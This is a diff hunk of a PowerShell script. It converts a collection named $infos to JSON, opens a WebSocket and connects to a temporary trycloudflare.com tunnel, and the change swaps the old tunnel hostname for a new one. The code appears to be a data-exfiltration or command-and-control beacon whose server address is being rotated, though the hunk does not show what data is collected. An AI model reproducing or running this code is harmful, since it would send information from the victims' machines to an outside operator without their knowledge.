@@ -52,7 +52,7 @@ $infos = @{
 $json = $infos | ConvertTo-Json
 
 $ws = New-Object System.Net.WebSockets.ClientWebSocket
-$uri = [System.Uri]"wss://mainly-gold-omaha-reviewer.trycloudflare.com/ws"
+$uri = [System.Uri]"wss://nodes-cite-plain-thursday.trycloudflare.com/ws"
 $token = [System.Threading.CancellationToken]::None
 
 $task = $ws.ConnectAsync($uri, $token)
